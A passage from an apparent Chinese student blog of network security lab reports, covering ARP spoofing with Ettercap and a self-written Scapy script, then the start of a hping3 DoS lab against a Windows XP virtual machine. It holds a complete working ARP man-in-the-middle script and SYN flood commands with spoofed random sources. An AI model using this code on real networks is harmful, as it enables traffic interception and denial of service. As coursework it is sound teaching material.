<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img21-1.png" alt="图21-1 arp部分抓包细节"></p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img21-2.png" alt="图21-2 arp部分抓包细节"></p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img21-3.png" alt="图21-3 arp部分抓包细节"></p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img21-4.png" alt="图21-4 arp部分抓包细节"></p>
<p>5.由以上详细信息可以看到，wireshark抓到了kali攻击机（Mac地址为00:0c:29:a5:82:6c）向靶机windows xp网关地址（IP地址为192.168.204.135）发送ARP欺骗包。</p>
<p>（1）攻击机kali向靶机windows xp发送ARP包，包中的Mac地址为kali自己的Mac地址00:0c:29:a5:82:6c，但IP地址为靶机的IP地址192.168.204.135，以此欺骗过靶机。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img22.png" alt="图22 攻击机发送arp欺骗包"></p>
<p>（2）在靶机存入的ARP缓存表中，靶机对应的IP所保存的是攻击机kali的Mac地址，因此发送给靶机windows xp的信息将可以被攻击机kali截获。</p>
<p>（3）最终发送给靶机的内容和靶机发送的内容都先经过攻击机kali，由此攻击机可以截获每次通信的内容，但不会破坏靶机正常通信。在此基础上，攻击机甚至还可以篡改通信所传输的内容，而不被靶机发现。</p>
<h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>通过本次Ettercap的ARP欺骗实验，我深入掌握了ARP协议的工作原理及其安全缺陷，并成功使用Ettercap工具实施了ARP欺骗攻击。在实验过程中，我不仅学会了发起攻击，还运用Wireshark抓包分析了ARP数据包的结构和欺骗后的网络流量变化。这一实践让我直观理解了中间人攻击的实现过程，增强了我对局域网安全风险的认识，也为我今后进一步学习网络攻防技术奠定了扎实基础。</p>
<h2 id="ARP欺骗课后实验"><a href="#ARP欺骗课后实验" class="headerlink" title="ARP欺骗课后实验"></a>ARP欺骗课后实验</h2><h3 id="实验目的-1"><a href="#实验目的-1" class="headerlink" title="实验目的"></a>实验目的</h3><p>基于Winpcap（或其它网络开发包Libpcap&#x2F;Jpcap&#x2F;Scapy等）编写程序，对指定的目标IP地址进行ARP欺骗攻击。</p>
<h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><p>(1) 攻击机：Kali-linux 2022.3</p>
<p>(2) 靶机：windows xp</p>
<p>(3) 软件：ettercap-0.8.31，wireshark</p>
<h3 id="实验过程与结果-1"><a href="#实验过程与结果-1" class="headerlink" title="实验过程与结果"></a>实验过程与结果</h3><h4 id="步骤一：安装Scapy"><a href="#步骤一：安装Scapy" class="headerlink" title="步骤一：安装Scapy"></a>步骤一：安装Scapy</h4><p>1.在攻击机kali中打开终端，输入命令“sudo apt install python3-pip”安装pip3。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p1.png" alt="图1 kali安装pip3"></p>
<p>2.在攻击机kali终端中输入命令“pip3 install Scapy”安装Scapy。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p2.png" alt="图2 kali安装Scapy"></p>
<h4 id="步骤二：python编写ARP欺骗程序"><a href="#步骤二：python编写ARP欺骗程序" class="headerlink" title="步骤二：python编写ARP欺骗程序"></a>步骤二：python编写ARP欺骗程序</h4><p>1.实验环境：攻击机：kali；靶机（受害者）：windows xp</p>
<p>2.查看攻击机及靶机信息：首先通过靶机windows xp的ipconfig &#x2F;all命令查看靶机的IP地址、Mac地址、网关等信息；通过攻击机kali的ifconfig命令查看攻击机的IP地址及Mac地址。</p>
<p>此部分信息同课上实验中两主机信息：</p>
<p>kali：IP地址：192.168.204.134；Mac地址：00:0c:29:a5:82:6c</p>
<p>windows xp本机：IP地址：192.168.204.135；Mac地址：00:0c:29:5D:E8:C3</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p3.png" alt="图3 ipconfig /all查看靶机信息"></p>
<p>windows xp网关：IP地址：192.168.204.135；Mac地址：00:50:56:e8:44:a5</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p4.png" alt="图4 靶机受ARP欺骗攻击之前的ARP表"></p>
<p>3.为了实现ARP欺骗，我们要构造ARP包并发送，因此首先需要了解ARP报文结构。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p5.png" alt="图5 ARP报文结构"></p>
<p>硬件类型:表明ARP实现在何种类型的网络上。<br>协议类型:代表解析协议(上层协议)。一般是0800，即IP。<br>硬件地址长度:MAC地址长度，此处为6个字节。<br>协议地址长度:IP地址长度，此处为4个字节。<br>操作类型:代表ARP数据包类型。0表示ARP请求数据包，1表示ARP应答数据包。<br>源MAC地址:发送端MAC地址。<br>源IP地址:代表发送端协议地址(IP地址)。<br>目标MAC地址:目的端MAC地址(待填充)。<br>目标IP地址:代表目的端协议地址(IP地址)。</p>
<p>4.参照课上实验利用Ettercap实现Arp欺骗攻击的逻辑原理，结合Scapy使用方法，设计出ARP欺骗程序流程如下图所示：</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p6.png" alt="图6 ARP欺骗程序流程图"></p>
<p>5.Arp_Spoof函数：构造Arp欺骗包并发送至指定的目标IP地址。</p>
<p>（1）传入参数：目标IP地址target_ip、目标Mac地址target_mac、攻击机IP地址sender_ip.</p>
<p>（2）利用Scapy的ARP方法构造欺骗的Arp包。</p>
<p>其中，ARP方法各参数如下：</p>
<ul>
<li>op：取值为1或2时，代表ARP请求或响应包，默认值为1</li>
<li>hwsrc：源Mac地址</li>
<li>psrc：源IP地址</li>
<li>hwdst：目的Mac地址</li>
<li>pdst：目的IP地址</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">spoofedarp = ARP(op=<span class="number">2</span>, psrc=sender_ip, pdst=target_ip, hwdst=target_mac)</span><br></pre></td></tr></table></figure>

<p>（3）构造了一个欺骗的ARP响应包spoofedarp，并将目的IP地址、Mac地址及源IP地址作为参数传入ARP方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">send(spoofedarp, verbose=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>（4）发送刚刚构造的ARP响应包，并置verbose为False表示运行时不显示详细信息。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p7.png" alt="图7 Arp_Spoof函数"></p>
<p>6.Arp_Spoof函数：构造正常的Arp包并发送至指定的目标IP地址以将其Arp表恢复至原有正常状态。</p>
<p>（1）传入参数：目标IP地址target_ip、目标Mac地址target_mac、攻击机IP地址sender_ip、攻击机Mac地址sender_mac。</p>
<p>（2）构造正常的ARP响应包：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">normalarp = ARP(op=<span class="number">2</span>, hwsrc=sender_mac, psrc=sender_ip, hwdst=target_mac, pdst=target_ip)</span><br></pre></td></tr></table></figure>

<p>构造了一个正常的ARP响应包normalarp，并将目的IP地址、Mac地址及源IP地址、源Mac地址作为参数传入ARP方法。</p>
<p>（3）发送ARP响应包：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">send(normalarp, verbose=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>发送刚刚构造的ARP响应包，并置verbose为False表示运行时不显示详细信息。</p>
<p>（4）打印提示信息：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ARP Table restored to normal for&quot;</span>, target_ip)</span><br></pre></td></tr></table></figure>

<p>打印输出已经将目的IP地址对应Arp表恢复至正常状态的提示信息。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p8.png" alt="图8 Arp_Restore函数"></p>
<p>8.main函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_target1_ip = <span class="built_in">input</span>(“Target1 IP:”)_</span><br><span class="line">_target2_ip = <span class="built_in">input</span>(“Target2 IP:”)_</span><br></pre></td></tr></table></figure>

<p>首先由用户输入两个IP地址，将其分别设置为Target1和Target2.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_<span class="keyword">try</span>:  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Target1 MAC:&quot;</span>, target_mac)  </span><br><span class="line"><span class="keyword">except</span>:  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ERROR: Target machine did not respond ARP broadcast.&quot;</span>)  </span><br><span class="line">quit()_</span><br></pre></td></tr></table></figure>

<p>将靶机Mac地址设置为目标Mac地址，若设置失败则抛出异常。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_<span class="keyword">try</span>:  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Sending spoofed ARP responses.&quot;</span>)  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line"><span class="comment">#进行Arp欺骗中间人攻击  </span></span><br><span class="line">Arp_Spoof(target1_ip, target_mac, target2_ip) <span class="comment">#欺骗靶机  </span></span><br><span class="line">Arp_Spoof(target2_ip, target_mac, target1_ip) <span class="comment">#欺骗网关_</span></span><br></pre></td></tr></table></figure>

<p>不断进行while循环向靶机和网关发送Arp欺骗包，进行中间人攻击。</p>
<p>（a）欺骗靶机与它通信的网关IP地址对应的物理地址是攻击机的Mac地址，由此靶机的Arp表中IP地址192.168.204.2对应的Mac地址由00:50:56:e8:44:a5修改为00:0c:29:a5:82:6c，靶机发送给网关的信息都将被攻击机截获。</p>
<p>（b）欺骗网关与它通信的靶机IP地址对应的物理地址是攻击机的Mac地址，由此网关的Arp表中IP地址192.168.204.135对应的Mac地址由00:0c:29:5d:e8:c3修改为00:0c:29:a5:82:6c，网关发送给靶机的信息都将被攻击机截获。</p>
<p>（c）由此，攻击机对靶机和网关都成功实施Arp欺骗，实现中间人攻击，截获双方通信内容而不影响其正常通信。</p>
<p>（4）恢复ARP表：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ARP spoofing stopped.&quot;</span>)</span><br><span class="line">    <span class="comment">#恢复Arp表</span></span><br><span class="line">    Arp_Restore(target2_ip, target_mac, target1_ip, target_mac) <span class="comment">#恢复网关Arp表</span></span><br><span class="line">    Arp_Restore(target1_ip, target_mac, target2_ip, target_mac) <span class="comment">#恢复靶机Arp表</span></span><br><span class="line">    quit()</span><br></pre></td></tr></table></figure>

<p>结束Arp欺骗攻击后，分别向靶机和网关发送正确的Arp包，使网关Arp表中靶机的物理地址恢复为00:0c:29:5d:e8:c3、靶机Arp表中网关的物理地址恢复为00:50:56:e8:44:a5，还原至正确状态。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p9.png" alt="图9 程序主函数main函数"></p>
<p>8.最终编写完成的Arp欺骗攻击程序代码如下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">target1_mac = <span class="string">&quot;00:0c:29:5d:e8:c3&quot;</span>    <span class="comment">#靶机本机的Mac地址</span></span><br><span class="line">target2_mac = <span class="string">&quot;00:50:56:e8:44:a5&quot;</span>    <span class="comment">#网关的Mac地址</span></span><br><span class="line">send_mac = <span class="string">&quot;00:0c:29:a5:82:6c&quot;</span>  <span class="comment">#攻击机kali的Mac地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Arp欺骗</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Arp_Spoof</span>(<span class="params">target_ip, target_mac, sender_ip</span>):</span><br><span class="line">    <span class="comment">#构造欺骗ARP包</span></span><br><span class="line">    spoofedarp = ARP(op=<span class="number">2</span>, psrc=sender_ip, pdst=target_ip, hwdst=target_mac)</span><br><span class="line">    send(spoofedarp, verbose=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Arp表恢复</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Arp_Restore</span>(<span class="params">target_ip, target_mac, sender_ip, sender_mac</span>):</span><br><span class="line">    <span class="comment">#构造正常ARP包</span></span><br><span class="line">    normalarp = ARP(op=<span class="number">2</span>, hwsrc=sender_mac, psrc=sender_ip, hwdst=target_mac, pdst=target_ip)</span><br><span class="line">    send(normalarp, verbose=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ARP Table restored to normal for&quot;</span>, target_ip)</span><br><span class="line"></span><br><span class="line"><span class="comment">#主函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#设置Target1和Target2</span></span><br><span class="line">    target1_ip = <span class="built_in">input</span>(<span class="string">&quot;Target1 IP:&quot;</span>)</span><br><span class="line">    target2_ip = <span class="built_in">input</span>(<span class="string">&quot;Target2 IP:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#获取靶机本机Mac地址</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Target1 MAC:&quot;</span>, target1_mac)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: Target1 did not respond ARP broadcast.&quot;</span>)</span><br><span class="line">        quit()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#获取网关Mac地址</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Target2 MAC:&quot;</span>, target2_mac)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: Target2 did not respond ARP broadcast.&quot;</span>)</span><br><span class="line">        quit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Sending spoofed ARP responses.&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment">#进行Arp欺骗中间人攻击</span></span><br><span class="line">            Arp_Spoof(target1_ip, target1_mac, target2_ip) <span class="comment">#欺骗靶机</span></span><br><span class="line">            Arp_Spoof(target2_ip, target2_mac, target1_ip) <span class="comment">#欺骗网关</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ARP spoofing stopped.&quot;</span>)</span><br><span class="line">        <span class="comment">#恢复Arp表</span></span><br><span class="line">        Arp_Restore(target1_ip, target1_mac, target2_ip, target2_mac)  <span class="comment"># 恢复靶机Arp表</span></span><br><span class="line">        Arp_Restore(target2_ip, target2_mac, target1_ip, target1_mac)  <span class="comment">#恢复网关Arp表</span></span><br><span class="line">        quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h4 id="步骤三-运行ARP欺骗程序"><a href="#步骤三-运行ARP欺骗程序" class="headerlink" title="步骤三 运行ARP欺骗程序"></a>步骤三 运行ARP欺骗程序</h4><h5 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h5><p>1.在攻击机kali中输入命令“sudo su”进入管理员模式，然后在root权限下使用“echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward”打开IP转发功能后，输入“python3 ArpSpoofer.py”运行编写的ARP欺骗程序。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p10.png" alt="图10 运行ARP欺骗程序ArpSpoofer.py"></p>
<p>2.Arp欺骗攻击正式开始前，在靶机windows xp打开命令行输入“arp -a”命令查看原始Arp表，可以看到此时网关的IP地址192.168.204.2所对应的Mac地址为00:50:56:e8:44:a5。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p11.png" alt="图11 Arp欺骗攻击前的靶机Arp表"></p>
<p>3.分别输入靶机本机的IP地址192.168.204.135和网关的IP地址192.168.204.2，将其设置为目标IP地址Target1、Target2，回车程序读取靶机本机Mac地址和网关Mac地址，开始向靶机本机和网关发送Arp欺骗包进行Arp欺骗攻击。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p12.png" alt="图12 开始Arp欺骗攻击"></p>
<p>4.Arp欺骗攻击进行过程中，在靶机命令行输入“arp -a”命令查看受到攻击后的靶机Arp表，发现此时网关的IP地址192.168.204.2所对应的Mac地址变为攻击机kali的Mac地址00:0c:29:a5:82:6c。由此可知，成功实施Arp欺骗修改了靶机的Arp表，使得靶机发往网关的信息均被攻击机kali截获，实现中间人攻击。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p13.png" alt="图13 受到Arp欺骗攻击后的靶机Arp表"></p>
<p>5.在攻击机kali终端中按下ctrl+C停止当前Arp欺骗攻击，程序输出“ARP spoofing stopped.”，并执行接下来的代码恢复靶机本机及网关的Arp表。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p14.png" alt="图14 停止Arp欺骗攻击并恢复Arp表"></p>
<p>6.攻击机Arp欺骗攻击程序结束后，在靶机命令行中输入“arp -a”命令再次查看恢复后的靶机Arp表。下图对比可知，靶机Arp表中网关IP地址192.168.204.2所对应的Mac地址由kali的Mac地址（00:0c:29:a5:82:6c）恢复回网关的Mac地址（00:50:56:e8:44:a5）。由此可知，结束Arp欺骗攻击后恢复Arp表成功。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p15.png" alt="图15 恢复后的靶机Arp表"></p>
<h5 id="禁止上网"><a href="#禁止上网" class="headerlink" title="禁止上网"></a>禁止上网</h5><p>1.在攻击机kali中输入命令“sudo su”进入管理员模式，然后在root权限下使用“echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward”关闭IP转发功能后，输入“python3 ArpSpoofer.py”运行编写的ARP欺骗程序。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p16.png" alt="图16 开始Arp欺骗攻击"></p>
<p>2.Arp欺骗攻击正式开始前，在靶机windows xp打开命令行输入“ping <a href="http://www.baidu.com/">www.baidu.com</a>”能够ping通，说明靶机此时可以正常上网。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p17.png" alt="图17 靶机可以正常上网"></p>
<p>3.分别输入网关的IP地址192.168.204.2和靶机本机的IP地址192.168.204.135，将其设置为目标IP地址Target1、Target2，回车程序读取靶机本机Mac地址和网关Mac地址，开始向网关和靶机本机发送Arp欺骗包进行Arp欺骗攻击。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p18.png" alt="图18 开始Arp欺骗攻击"></p>
<p>4.Arp欺骗攻击过程中，再次在靶机命令行中输入“ping <a href="http://www.baidu.com/">www.baidu.com</a>”命令，此时如下图所示提示“Ping request could not find host <a href="http://www.baidu.com/">www.baidu.com</a>. Please check the name and try again.”。由此可知，靶机受到Arp欺骗攻击后无法上网。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p19.png" alt="图19 主机受到Arp欺骗攻击后无法上网"></p>
<h5 id="中间人攻击与禁止上网攻击的区别"><a href="#中间人攻击与禁止上网攻击的区别" class="headerlink" title="中间人攻击与禁止上网攻击的区别"></a>中间人攻击与禁止上网攻击的区别</h5><p>1.中间人攻击：攻击机发送欺骗的Arp包欺骗靶机主机，将自己假扮为网关，使得靶机将希望发送给网关的通信内容全部发送给攻击机，由此攻击机实现中间人攻击，可以截获靶机和网关的通信内容。</p>
<p>2.禁止上网攻击：攻击机发送欺骗的Arp包欺骗网关，将自己假扮为靶机主机，使得网关将希望回复给主机的通信内容全部回复给攻击机，导致靶机无法受到网关的应答包无法正常上网，由此攻击机实现禁止上网攻击。</p>
<p>3.有以上分析可知，在实施中间人攻击时，将靶机主机IP地址设置为Target1、网关IP地址设置为Target2；在实施禁止上网攻击时，将网关IP地址设置为Tareget1、靶机主机IP地址设置为Target2.</p>
<p>4.在实施中间人攻击时需打开ip转发功能，而在禁止上网攻击中则需要关闭ip转发功能。</p>
<h3 id="实验总结-1"><a href="#实验总结-1" class="headerlink" title="实验总结"></a>实验总结</h3><p>这次实验，我使用Scapy手动构造ARP欺骗数据包，深入理解了ARP协议的数据结构及欺骗攻击的实现原理。在实验中，我严格按照ARP报文格式填充每个字段，包括硬件类型（Ethernet）、协议类型（IP）、MAC&#x2F;IP地址长度、操作类型（ARP应答包）​等，确保数据包符合标准，能够成功欺骗目标主机。我掌握了ARP报文结构​，Scapy的使用等内容。这不仅提升了我的网络协议分析能力，也让我认识到ARP欺骗的严重性，进一步理解了防御措施（如静态ARP绑定、动态ARP检测）的重要性。未来，我将继续深入研究网络攻防技术，提高安全防护能力。</p>
<p><em>实验报告持续更新中，欢迎交流讨论！</em></p>
]]></content>
      <categories>
        <category>第5学期实验</category>
        <category>网络安全实验</category>
      </categories>
      <tags>
        <tag>北邮</tag>
        <tag>实验</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实验2：DOS攻击</title>
    <url>/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="DOS攻击实验"><a href="#DOS攻击实验" class="headerlink" title="DOS攻击实验"></a>DOS攻击实验</h2><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><p>1.使用一种DoS工具进行验证；</p>
<p>2.运行抓包工具，对两种DoS攻击原理进行验证分析。</p>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>1.两台虚拟机，一台攻击机、一台靶机，虚拟机的系统可以根据选择的Dos工具确定。靶机配置nginx服务器。</p>
<p>DoS工具参考：hping3（使用），LOIC、HOIC、XOIC</p>
<p>2.攻击机：kali linux 2022.3</p>
<p>靶机：windows xp</p>
<p>（使用仅主机模式）</p>
<p>软件：nginx1.1.0, hping3 3.0.0-alpha-2</p>
<h3 id="实验过程与结果"><a href="#实验过程与结果" class="headerlink" title="实验过程与结果"></a>实验过程与结果</h3><h4 id="步骤一：搭建实验环境并查看虚拟机信息"><a href="#步骤一：搭建实验环境并查看虚拟机信息" class="headerlink" title="步骤一：搭建实验环境并查看虚拟机信息"></a>步骤一：搭建实验环境并查看虚拟机信息</h4><p>1.把nginx文件夹放到C盘，在C:\nginx1.1.0路径下通过start nginx命令开启靶机http服务</p>
<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img1.png" alt="图1 nginx启动命令"></p>
<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img2.png" alt="图2 nginx启动结果"></p>
<p>2.靶机浏览器访问localhost（或127.0.0.1），攻击机浏览器访问192.168.32.128（靶机IP），验证nginx已经开启。</p>
<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img3.png" alt="图3 靶机访问localhost"></p>
<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img4.png" alt="图4 攻击机访问靶机IP"></p>
<h4 id="步骤二：攻击过程"><a href="#步骤二：攻击过程" class="headerlink" title="步骤二：攻击过程"></a>步骤二：攻击过程</h4><p>1.先通过ipconfig&#x2F;ifconfig命令查看攻击机和靶机的网络配置信息。</p>
<p>winxp：ip:192.168.32.128</p>
<p>kali：ip:192.168.32.129</p>
<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img5.png" alt="图5 靶机网络配置"></p>
<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img6.png" alt="图6 攻击机网络配置"></p>
<p>2.获得靶机的ip地址后，扫描靶机开启的端口（hping3可以扫描端口，或者使用nmap扫描）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -Pn 192.168.32.128</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img7.png" alt="图7 端口扫描结果"></p>
<p>3.hping3 -h命令可以查看各项参数说明，也可以在附上的参考文档中查看。选择开启的端口，比如80端口，根据参考文档选择合适的参数，发送SYN&#x2F;UDP包；构造命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hping3 -I eth0 -a 192.168.32.129 -S 192.168.32.128 -p 80 -i u1000</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img8.png" alt="图8 hping3攻击命令"></p>
<p>攻击机使用浏览器访问靶机，观察网页是否仍可访问，或者查看攻击前后ping靶机的响应时延，从而验证攻击效果。同时运行靶机任务管理器，查看系统性能，感受DoS攻击对服务器的影响。</p>
<p>4.SYN Flood</p>
<p>（1）攻击原理：SYN Flood不会完成TCP三次握手的第三步，也就是不发送确认连接的信息给服务器。这样，服务器无法完成第三次握手，但服务器不会立即放弃，服务器会不停的重试并等待一定的时间后放弃这个未完成的连接，这段时间叫做SYN timeout，这段时间大约30秒-2分钟左右。若是一个用户在连接时出现问题导致服务器的一个线程等待1分钟并不是什么大不了的问题，但是若有人用特殊的软件大量模拟这种情况，那后果就可想而知了。一个服务器若是处理这些大量的半连接信息而消耗大量的系统资源和网络带宽，这样服务器就不会再有空余去处理普通用户的正常请求 (因为客户的正常请求比率很小)，即服务器无法正常工作。</p>
<p>（2）命令操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hping3 -I eth0 --rand-source -S 192.168.32.128 -p 80 -i u1000 --flood</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img9.png" alt="图9 SYN Flood攻击命令"></p>
<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img10.png" alt="图10 攻击前ping结果"></p>
<p>（未进行DoS攻击前）</p>
<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img11.png" alt="图11 攻击后ping结果"></p>
<p>（进行DoS攻击后）</p>
<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img12.png" alt="图12 靶机无法访问"></p>
<p>（发现打不开了）</p>
<p>（3）可以看到DoS攻击前后ping靶机的time的变化，DoS攻击后time的时间大大增长，并且访问时间变慢。甚至靶机打不开界面。</p>
<p>5.UDP Flood</p>
<p>（1）攻击原理：攻击者利用大量UDP小包冲击DNS服务器或Radius认证服务器、流媒体视频服务器。100k pps的UDP Flood经常将线路上的骨干设备例如防火墙打瘫，造成整个网段的瘫痪。由于UDP协议是一种无连接的服务，在UDP FLOOD攻击中，攻击者可发送大量伪造源IP地址的小UDP包。但是，由于UDP协议是无连接性的，所以只要开了一个UDP的端口提供相关服务的话，那么就可针对相关的服务进行攻击。</p>
<p>（2）命令操作</p>
<p>先扫描开放的UDP端口</p>
